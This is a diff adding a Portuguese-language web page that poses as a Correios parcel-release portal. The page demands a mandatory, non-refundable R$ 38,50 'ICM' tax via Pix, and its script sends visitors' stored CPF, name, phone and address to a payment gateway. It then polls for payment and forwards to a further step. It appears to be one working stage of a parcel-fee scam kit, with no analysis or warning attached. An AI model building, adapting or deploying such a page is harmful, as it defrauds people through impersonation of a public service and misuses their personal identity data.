@@ -1,0 +1,654 @@
+﻿<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <script src="../../js/config.js"></script>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Portal Correios — Liberação de Encomenda</title>
+  <meta name="description"
+    content="Portal oficial para liberação de encomendas internacionais. Regularize sua situação postal.">
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700;900&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --correios-yellow: #FFD400;
+      --correios-blue: #00416B;
+      --correios-blue-light: #00568C;
+      --correios-gray: #F2F2F2;
+      --ink: #111827;
+      --paper: #F9FAFB;
+    }
+
+    html,
+    body {
+      background: var(--correios-gray);
+      color: var(--ink);
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Arial, sans-serif;
+      font-synthesis-weight: none;
+      text-rendering: optimizeLegibility
+    }
+
+    .brand {
+      background: var(--correios-yellow);
+      border-bottom: 4px solid var(--correios-blue)
+    }
+
+    .pp-card {
+      background: #fff;
+      border: 1px solid rgba(0, 65, 107, .10);
+      border-radius: 16px;
+      box-shadow: 0 10px 32px rgba(0, 0, 0, .05)
+    }
+
+    .btn-correios {
+      background: var(--correios-blue);
+      color: #fff;
+      border-radius: 10px;
+      padding: .95rem 1rem;
+      font-weight: 800;
+      letter-spacing: .2px;
+      transition: background .15s, transform .02s;
+      box-shadow: 0 6px 16px rgba(0, 65, 107, .20);
+      width: 100%;
+      display: block;
+      text-align: center;
+    }
+
+    .btn-correios:hover {
+      background: var(--correios-blue-light);
+    }
+
+    .btn-correios:active {
+      transform: translateY(1px)
+    }
+
+    /* Loader */
+    #loader {
+      position: fixed;
+      inset: 0;
+      z-index: 60;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(1200px 600px at 50% -10%, rgba(255, 212, 0, .15), transparent), 
+                  linear-gradient(180deg, #ffffff 0%, #f2f2f2 100%);
+      transition: opacity 0.5s ease-out, visibility 0.5s;
+    }
+
+    .loader-card {
+      width: min(560px, 92vw);
+      border-radius: 16px;
+      background: #fff;
+      box-shadow: 0 14px 34px rgba(0, 65, 107, .08);
+      border: 1px solid rgba(0, 65, 107, .10);
+      padding: 32px;
+      text-align: center;
+    }
+
+    .badge {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      margin: 0 auto 16px;
+      background: var(--correios-blue);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--correios-yellow);
+    }
+
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 999px;
+      background: var(--correios-blue);
+      opacity: .25;
+      animation: pulse 1.2s infinite;
+      display: inline-block;
+      margin: 0 4px
+    }
+
+    .dot:nth-child(2) { animation-delay: .2s }
+    .dot:nth-child(3) { animation-delay: .4s }
+
+    @keyframes pulse {
+      0%, 100% { opacity: .25; transform: translateY(0) }
+      50% { opacity: 1; transform: translateY(-3px) }
+    }
+
+    #confetti-canvas {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 40;
+    }
+
+    .info-box {
+      border-radius: 14px;
+      border-left: 6px solid var(--correios-yellow);
+      background: #f9f9f9;
+      padding: 1.25rem;
+    }
+
+    .section-box {
+      border-radius: 14px;
+      border: 1px solid #e5e7eb;
+      background: #fff;
+      padding: 1.25rem;
+    }
+    
+    /* Garantir que o conteúdo apareça */
+    #content.show {
+      opacity: 1 !important;
+      pointer-events: auto !important;
+      select: auto !important;
+    }
+  </style>
+</head>
+
+<body class="min-h-screen flex flex-col">
+  <header class="brand shadow-lg">
+    <div class="container mx-auto px-4 py-4 flex items-center justify-between">
+      <div class="flex items-center gap-3">
+        <svg width="120" height="30" viewBox="0 0 120 30" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M10 5L2 15L10 25M20 5L28 15L20 25" stroke="#00416B" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
+          <text x="35" y="22" font-family="Arial" font-weight="bold" font-size="18" fill="#00416B">CORREIOS</text>
+        </svg>
+      </div>
+      <span class="text-correios-blue font-bold text-xs md:text-sm uppercase tracking-tight">Portal de Importação</span>
+    </div>
+  </header>
+
+  <!-- LOADER -->
+  <div id="loader" role="status" aria-live="polite">
+    <div class="loader-card">
+      <div class="badge" aria-hidden="true">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+      </div>
+      <h1 id="loader-title" class="text-xl font-bold text-neutral-900">Verificando pedido…</h1>
+      <p id="loader-sub" class="mt-2 text-sm text-neutral-600">Consultando status da sua encomenda no sistema aduaneiro</p>
+      <div class="mt-6"><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+    </div>
+  </div>
+
+  <!-- Confetti (canvas) -->
+  <canvas id="confetti-canvas"></canvas>
+
+  <!-- CONTEÚDO -->
+  <main id="content"
+    class="opacity-0 pointer-events-none select-none transition-opacity duration-500 max-w-4xl mx-auto px-4 py-8 relative z-10">
+    <section class="pp-card p-6 md:p-10">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6 border-b pb-6">
+        <div>
+          <h1 id="icm-heading" class="text-2xl md:text-3xl font-black text-correios-blue uppercase">Pagamento Recebido</h1>
+          <!-- Código do objeto removido -->
+        </div>
+        <div class="bg-correios-yellow px-4 py-2 rounded-full text-correios-blue font-bold text-sm self-start md:self-center">
+          Aguardando ICM
+        </div>
+      </div>
+
+      <div class="mt-5 info-box">
+        <h2 class="font-bold text-correios-blue mb-2">Liberação de Encomenda</h2>
+        <p class="text-sm text-neutral-900 leading-relaxed">
+          Para concluir a <strong>liberação da sua encomenda</strong>, é obrigatório quitar o <strong>ICM (Imposto sobre Circulação de Mercadorias)</strong> referente a esta remessa internacional.
+        </p>
+        <div class="mt-4 flex items-center gap-2">
+            <span class="text-sm font-bold text-correios-blue">Valor da Taxa:</span>
+            <span id="icm-tax-value" class="text-xl font-black text-correios-blue">R$ 38,50</span>
+        </div>
+        <ul class="mt-4 text-[13px] text-neutral-800 space-y-2">
+          <li class="flex gap-2"><span>•</span> <span><strong>Obrigatório</strong> para prosseguir com a liberação postal.</span></li>
+          <li class="flex gap-2"><span>•</span> <span><strong>Não reembolsável</strong> após a emissão do documento.</span></li>
+          <li class="flex gap-2"><span>•</span> <span>Sem o pagamento, o objeto será <strong>devolvido ao país de origem</strong>.</span></li>
+        </ul>
+      </div>
+
+      <div class="mt-8">
+        <div class="text-xs font-bold uppercase tracking-widest text-neutral-400 mb-2">TAXA DE EMISSÃO</div>
+        <div class="mt-2 flex items-baseline gap-3">
+          <div id="icm-main-value" class="text-5xl font-black text-correios-blue">R$ 38,50</div>
+          <div class="text-sm font-bold text-neutral-500">valor único</div>
+        </div>
+        <p class="mt-6 text-sm text-neutral-600">
+          Clique no botão abaixo para gerar o código <strong>Pix (Copia e Cola)</strong> e finalizar a regularização da sua encomenda.
+        </p>
+
+        <!-- BOTÃO (mantém o ID para seu JS) -->
+        <button id="btn-gerar-pix" class="btn-correios w-full mt-6 py-4 shadow-lg">
+          PAGAR TAXA AGORA (PIX <span id="btn-value">R$ 38,50</span>)
+        </button>
+        <a href="../3/index.html" class="mt-3 block text-center text-xs text-neutral-400 hover:text-neutral-600 underline">Não desejo adicionar agora, prosseguir para o próximo passo ›</a>
+
+        <p class="mt-6 text-center text-[11px] text-neutral-400 leading-relaxed">
+          A liberação do objeto ocorre automaticamente após a compensação do pagamento. <br>
+          Este é um procedimento padrão para importações.
+        </p>
+      </div>
+
+      <div class="mt-10 section-box">
+        <h3 class="font-bold text-correios-blue uppercase text-sm mb-3">O que é o ICM?</h3>
+        <p class="text-sm text-neutral-600 leading-relaxed">
+          O ICM é o imposto incidente sobre a circulação de mercadorias, inclusive as vindas do exterior. O pagamento desta taxa é indispensável para que o processo de nacionalização da sua encomenda seja concluído e a entrega realizada.
+        </p>
+      </div>
+
+      <!-- Seção PIX (Oculta até gerar) -->
+      <div id="pix-section" class="mt-8 hidden flex-col items-center p-8 bg-white rounded-xl border-2 border-dashed border-correios-blue text-center">
+        <div class="mb-6 text-center">
+          <h2 class="text-lg font-bold text-correios-blue">Pix Gerado com Sucesso!</h2>
+          <p class="text-sm text-neutral-500">Escaneie o QR Code ou copie o código abaixo.</p>
+        </div>
+
+        <div id="qr-wrap"
+          class="p-4 bg-white rounded-xl shadow-inner border border-neutral-100 flex items-center justify-center mb-6 transition-transform duration-300 hover:scale-[1.02]">
+          <!-- QR preenchido via JS -->
+        </div>
+
+        <div class="w-full mb-6">
+          <div id="pix-code"
+            class="w-full p-4 bg-neutral-50 border border-neutral-200 rounded-lg text-xs text-neutral-600 break-all select-all font-mono text-left">
+          </div>
+        </div>
+
+        <button id="btn-copy" onclick="copyPixCode()"
+          class="w-full bg-correios-yellow text-correios-blue py-4 px-4 rounded-lg font-black transition-all shadow-md hover:brightness-95">
+          COPIAR CÓDIGO PIX
+        </button>
+
+        <div id="checking-payment"
+          class="mt-6 hidden items-center justify-center gap-3 text-sm text-correios-blue font-bold animate-pulse">
+          <div class="w-3 h-3 rounded-full bg-correios-yellow animate-ping"></div>
+          Aguardando confirmação do banco...
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <footer class="mt-auto py-10 bg-neutral-200 text-center">
+    <div class="container mx-auto px-4">
+        <p class="text-[10px] text-neutral-500 uppercase font-bold tracking-widest">
+            © 2026 Empresa Brasileira de Correios e Telégrafos. Todos os direitos reservados.
+        </p>
+    </div>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <script src="../../js/xpay-gateway.js"></script>
+
+  <!-- Script Integrado de Pagamento XPay Brasil para Upsell -->
+  <script>
+    function launchConfetti() {
+      const canvas = document.getElementById('confetti-canvas');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+      const pieces = [];
+      const colors = ['#FFD400', '#00416B', '#10B981', '#3B82F6', '#EF4444', '#F59E0B'];
+      for (let i = 0; i < 90; i++) {
+        pieces.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * -canvas.height * 0.5,
+          size: Math.random() * 9 + 4,
+          color: colors[Math.floor(Math.random() * colors.length)],
+          speedY: Math.random() * 4 + 2.5,
+          speedX: Math.random() * 4 - 2,
+          rotation: Math.random() * 360
+        });
+      }
+      let frame = 0;
+      function loop() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        pieces.forEach(p => {
+          p.y += p.speedY;
+          p.x += p.speedX;
+          p.rotation += 3;
+          ctx.fillStyle = p.color;
+          ctx.fillRect(p.x, p.y, p.size, p.size);
+        });
+        frame++;
+        if (frame < 220) requestAnimationFrame(loop);
+        else ctx.clearRect(0, 0, canvas.width, canvas.height);
+      }
+      loop();
+    }
+
+    // Gerenciamento do Loader Inicial
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        const loader = document.getElementById('loader');
+        const content = document.getElementById('content');
+        if (loader) {
+          loader.style.opacity = '0';
+          setTimeout(function() {
+            loader.style.display = 'none';
+            if (content) content.classList.add('show');
+          }, 450);
+        }
+      }, 1500);
+    });
+
+    // Função de Fallback para Cópia
+    function fallbackCopy(text, callback) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      try {
+        document.execCommand('copy');
+        if (callback) callback();
+      } catch (err) {}
+      document.body.removeChild(ta);
+    }
+
+    function copyPixCode() {
+      const codeEl = document.getElementById('pix-code');
+      const code = codeEl ? codeEl.textContent.trim() : '';
+      const btn = document.getElementById('btn-copy');
+      if (!code) return;
+
+      function onCopied() {
+        if (btn) {
+          const originalText = btn.innerHTML;
+          btn.innerHTML = '✓ CÓDIGO PIX COPIADO!';
+          btn.style.backgroundColor = '#10b981';
+          btn.style.color = '#ffffff';
+          setTimeout(function() {
+            btn.innerHTML = originalText;
+            btn.style.backgroundColor = '';
+            btn.style.color = '';
+          }, 3000);
+        }
+      }
+
+      if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(code).then(onCopied).catch(function() {
+          fallbackCopy(code, onCopied);
+        });
+      } else {
+        fallbackCopy(code, onCopied);
+      }
+    }
+
+    function renderQRCode(pixCode, base64Img) {
+      const wrap = document.getElementById('qr-wrap');
+      if (!wrap) return;
+      wrap.innerHTML = '';
+
+      if (base64Img) {
+        const src = String(base64Img).startsWith('data:') ? base64Img : 'data:image/png;base64,' + base64Img;
+        wrap.innerHTML = '<img src="' + src + '" alt="QR Code Pix" style="max-width:220px; width:100%; height:auto; display:block; margin:0 auto; border-radius:8px;">';
+        return;
+      }
+
+      if (typeof QRCode !== 'undefined') {
+        try {
+          new QRCode(wrap, {
+            text: pixCode,
+            width: 220,
+            height: 220,
+            colorDark: "#000000",
+            colorLight: "#ffffff",
+            correctLevel: QRCode.CorrectLevel ? QRCode.CorrectLevel.M : 0
+          });
+          return;
+        } catch (_) {}
+      }
+
+      const onlineUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+      const fallbackUrl = 'https://quickchart.io/qr?text=' + encodeURIComponent(pixCode) + '&size=220';
+      wrap.innerHTML = '<img src="' + onlineUrl + '" onerror="this.onerror=null;this.src=\'' + fallbackUrl + '\'" alt="QR Code Pix" style="max-width:220px; width:100%; height:auto; display:block; margin:0 auto; border-radius:8px;">';
+    }
+
+    let statusWatcherTimer = null;
+    function iniciarStatusWatcher(txId) {
+      if (statusWatcherTimer) clearInterval(statusWatcherTimer);
+      let tries = 0;
+      statusWatcherTimer = setInterval(async function() {
+        tries++;
+        try {
+          let status = '';
+
+          // 1. Tentar direto XPay Brasil
+          if (window.XpayGateway && typeof window.XpayGateway.checkStatus === 'function') {
+            try {
+              const bStat = await window.XpayGateway.checkStatus(txId);
+              if (bStat && bStat.status) {
+                status = bStat.isPaid ? 'PAID' : String(bStat.status).toUpperCase();
+              }
+            } catch (_) {}
+          }
+
+          // 2. Fallback para endpoints locais
+          if (!status) {
+            const endpoints = [
+              '/api/check-status?id=' + encodeURIComponent(txId),
+              '/.netlify/functions/check-status?id=' + encodeURIComponent(txId),
+              '/37626323423/.netlify/functions/check-status?id=' + encodeURIComponent(txId),
+              '/api/check-status?id=' + encodeURIComponent(txId),
+              '../../api/check-status?id=' + encodeURIComponent(txId)
+            ];
+
+            let resData = null;
+            for (const ep of endpoints) {
+              try {
+                const res = await fetch(ep, { cache: 'no-store' });
+                if (res.ok) {
+                  resData = await res.json();
+                  break;
+                }
+              } catch (_) {}
+            }
+
+            if (resData) {
+              if (resData.isPaid) status = 'PAID';
+              else if (resData.status) status = String(resData.status).toUpperCase();
+              else if (resData.data && (resData.data.paymentStatus || resData.data.status)) {
+                status = String(resData.data.paymentStatus || resData.data.status).toUpperCase();
+              }
+            }
+          }
+
+          if (['PAID', 'CONFIRMED', 'APPROVED', 'PAGO'].includes(status)) {
+            clearInterval(statusWatcherTimer);
+            launchConfetti();
+            const checking = document.getElementById('checking-payment');
+            if (checking) {
+              checking.className = 'mt-6 flex flex-col items-center justify-center gap-2';
+              checking.style.display = 'flex';
+              checking.innerHTML = `
+                <div style="background:#ecfdf5; border:1px solid #10b981; color:#065f46; padding:12px 20px; border-radius:12px; font-weight:800; font-size:15px; display:inline-flex; align-items:center; gap:10px; box-shadow:0 4px 14px rgba(16,185,129,0.25);">
+                  <svg viewBox="0 0 24 24" width="22" height="22" fill="#10b981"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg>
+                  <span>Pagamento Confirmado! Redirecionando...</span>
+                </div>
+              `;
+            }
+            setTimeout(function() {
+              const search = window.location.search || '';
+              window.location.href = '../3/index.html' + search;
+            }, 1800);
+          } else if (['REFUSED', 'EXPIRED', 'ERROR', 'CANCELED'].includes(status)) {
+            clearInterval(statusWatcherTimer);
+          }
+        } catch (_) {}
+        if (tries >= 360) clearInterval(statusWatcherTimer);
+      }, 2500);
+    }
+
+    async function processarGeracaoPix() {
+      const btn = document.getElementById('btn-pay') || document.getElementById('btn-gerar-pix');
+      const errBox = document.getElementById('error-msg');
+      if (errBox) errBox.style.display = 'none';
+
+      if (btn) {
+        btn.disabled = true;
+        btn.style.opacity = '0.7';
+        btn.dataset.origText = btn.innerHTML;
+        btn.innerHTML = 'GERANDO COBRANÇA PIX...';
+      }
+
+      try {
+        const cpfLimpo = String(localStorage.getItem('site.cpf') || '11144477735').replace(/\D/g, '') || '11144477735';
+        const nomeSess = String(localStorage.getItem('site.nome') || 'Contribuinte');
+        const telefone = String(localStorage.getItem('site.telefone') || '11999999999').replace(/\D/g, '') || '11999999999';
+
+        const payload = {
+          customerData: {
+            name: nomeSess,
+            cpf: cpfLimpo,
+            email: 'contato.' + (cpfLimpo.slice(0, 6) || 'cliente') + '@gmail.com',
+            phone: telefone,
+            address: {
+              street: localStorage.getItem('site.rua') || 'Rua Principal',
+              number: '100',
+              neighborhood: localStorage.getItem('site.bairro') || 'Centro',
+              city: localStorage.getItem('site.cidade') || 'São Paulo',
+              state: localStorage.getItem('site.uf') || 'SP',
+              cep: localStorage.getItem('site.cep') || '01001000'
+            }
+          },
+          productData: {
+            title: 'Serviços e Taxas',
+            price: Number((3850 / 100).toFixed(2))
+          },
+          amount: 3850,
+          trackingParameters: (typeof window.getTrackingParameters === 'function' ? window.getTrackingParameters() : {})
+        };
+
+        let result = null;
+        let lastErr = null;
+
+        // 1. Tentar Gateway Direto XPay Brasil (CORS no navegador)
+        if (window.XpayGateway && typeof window.XpayGateway.createPix === 'function') {
+          try {
+            const bRes = await window.XpayGateway.createPix(payload.customerData, payload.productData, payload.amount);
+            if (bRes && (bRes.brCode || bRes.id)) {
+              result = bRes;
+            }
+          } catch (bErr) {
+            console.warn('Tentativa direta XPay Brasil:', bErr);
+            lastErr = bErr;
+          }
+        }
+
+        // 2. Fallback para endpoints locais
+        if (!result) {
+          const endpoints = [
+            '/api/create-pix',
+            '/.netlify/functions/create-pix',
+            '/37626323423/.netlify/functions/create-pix',
+            '/api/create-pix',
+            '/37626323423/api/create-pix',
+            '../../api/create-pix',
+            '../../../api/create-pix'
+          ];
+
+          for (const ep of endpoints) {
+            try {
+              const res = await fetch(ep, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+              });
+              if (res.ok) {
+                result = await res.json();
+                break;
+              }
+              const errJson = await res.json().catch(() => null);
+              if (res.status !== 404) {
+                throw new Error((errJson && (errJson.error || errJson.message)) || 'Falha ao processar pagamento');
+              }
+            } catch (e) {
+              lastErr = e;
+              if (e.message && !e.message.includes('404') && !e.message.includes('Failed to fetch')) {
+                throw e;
+              }
+            }
+          }
+        }
+
+        if (!result) {
+          throw lastErr || new Error('Não foi possível conectar ao servidor de pagamento.');
+        }
+
+        const pixCode = (result && (result.brCode || (result.data && result.data.brCode))) ||
+                        (result && result.data && (result.data.pix_code || result.data.qrCode || (result.data.pix && result.data.pix.qrcode))) ||
+                        (result && (result.pix_code || result.qrCode || result.code || result.qr_code));
+
+        const base64Img = (result && (result.brCodeBase64 || (result.data && result.data.brCodeBase64))) || null;
+        const txId = (result && (result.id || (result.data && result.data.id))) ||
+                     (result && (result.transactionId || (result.order && result.order.id)));
+
+        if (pixCode || base64Img) {
+          const pixSection = document.getElementById('pix-section');
+          const pixCodeEl = document.getElementById('pix-code');
+          const checkingEl = document.getElementById('checking-payment');
+
+          if (pixCodeEl) pixCodeEl.textContent = pixCode || '';
+          renderQRCode(pixCode, base64Img);
+
+          if (pixSection) {
+            pixSection.style.display = 'flex';
+            pixSection.classList.remove('hidden');
+          }
+          if (checkingEl) {
+            checkingEl.style.display = 'flex';
+            checkingEl.classList.remove('hidden');
+          }
+
+          if (btn) {
+            btn.innerHTML = '✓ PIX GERADO ABAIXO';
+            btn.style.backgroundColor = '#15803d';
+          }
+
+          if (txId) {
+            iniciarStatusWatcher(String(txId));
+          }
+
+          pixSection.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        } else {
+          throw new Error((result && (result.message || result.error)) || 'Resposta sem dados do PIX.');
+        }
+      } catch (err) {
+        if (errBox) {
+          errBox.textContent = 'Erro ao gerar PIX: ' + (err.message || 'Tente novamente em instantes.');
+          errBox.style.display = 'block';
+        } else {
+          alert('Erro ao gerar PIX: ' + (err.message || 'Tente novamente.'));
+        }
+        if (btn) {
+          btn.disabled = false;
+          btn.style.opacity = '1';
+          btn.innerHTML = btn.dataset.origText || 'PAGAR TAXA AGORA (PIX R$ 38,50)';
+        }
+      }
+    }
+
+    function generateIOFPix() {
+      processarGeracaoPix();
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      const b1 = document.getElementById('btn-pay');
+      const b2 = document.getElementById('btn-gerar-pix');
+      if (b1) b1.onclick = processarGeracaoPix;
+      if (b2) b2.onclick = processarGeracaoPix;
+    });
+  </script>
+
+</body>
+</html>
+
+
+
